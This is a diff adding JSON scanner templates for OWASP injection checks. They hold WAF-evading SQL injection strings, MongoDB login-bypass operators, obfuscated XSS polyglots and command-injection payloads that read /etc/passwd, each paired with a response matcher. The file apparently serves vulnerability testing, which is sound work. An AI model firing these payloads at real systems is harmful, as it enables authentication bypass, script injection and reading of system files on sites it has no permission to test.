@@ -1,0 +1,228 @@
+[
+  {
+    "id": "owasp-a05-sqli-waf-bypass",
+    "info": {
+      "name": "OWASP A05 - SQL Injection WAF Bypass",
+      "severity": "critical",
+      "category": "sqli",
+      "description": "Advanced SQL injection with WAF evasion techniques (OWASP A05:2025 - Injection)",
+      "references": [
+        "https://owasp.org/Top10/2025/A05_2025-Injection/"
+      ],
+      "tags": [
+        "owasp-a05",
+        "injection",
+        "sqli",
+        "waf-bypass"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "1' /*!50000AND*/ '1'='1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' /**/OR/**/1=1--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1'||'1'='1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' UnIoN SeLeCt null,null,null--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' %23%0aUNION%23%0aSELECT%23%0anull--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' AND SLEEP(5)--",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "SQL",
+          "mysql",
+          "syntax error",
+          "ORA-"
+        ]
+      },
+      {
+        "type": "response_time",
+        "condition": "greater_than",
+        "patterns": ["5000"]
+      }
+    ]
+  },
+  {
+    "id": "owasp-a05-nosql-injection-bypass",
+    "info": {
+      "name": "OWASP A05 - NoSQL Injection Bypass",
+      "severity": "high",
+      "category": "nosql-injection",
+      "description": "NoSQL injection targeting MongoDB with WAF bypass (OWASP A05:2025)",
+      "references": [
+        "https://owasp.org/Top10/2025/A05_2025-Injection/"
+      ],
+      "tags": [
+        "owasp-a05",
+        "injection",
+        "nosql",
+        "mongodb"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "{\"$ne\":null}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"$gt\":\"\"}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "username[$ne]=admin&password[$ne]=pass",
+        "encoding": "none",
+        "method": "POST"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "login successful",
+          "authenticated",
+          "token"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "owasp-a05-xss-polyglot-bypass",
+    "info": {
+      "name": "OWASP A05 - XSS Polyglot WAF Bypass",
+      "severity": "high",
+      "category": "xss",
+      "description": "Polyglot XSS payloads designed to bypass multiple WAF filters (OWASP A05:2025)",
+      "references": [
+        "https://owasp.org/Top10/2025/A05_2025-Injection/"
+      ],
+      "tags": [
+        "owasp-a05",
+        "injection",
+        "xss",
+        "polyglot",
+        "waf-bypass"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<img src=x oNeRRor=/**/alert`1`>",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<svg/onload=/**/self[`al`+`ert`]`1`>",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "<iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "<script>",
+          "onerror",
+          "javascript:"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "owasp-a05-command-injection-bypass",
+    "info": {
+      "name": "OWASP A05 - Command Injection with Bypass",
+      "severity": "critical",
+      "category": "command-injection",
+      "description": "OS command injection with WAF evasion (OWASP A05:2025)",
+      "references": [
+        "https://owasp.org/Top10/2025/A05_2025-Injection/"
+      ],
+      "tags": [
+        "owasp-a05",
+        "injection",
+        "rce",
+        "command-injection"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "; cat${IFS}/etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "| wh''oami",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "; ech''o 'vulnerable'",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "`cat</etc/passwd`",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "$(c''at${IFS}/etc/passwd)",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "root:x:",
+          "bin/bash",
+          "www-data"
+        ]
+      }
+    ]
+  }
+]
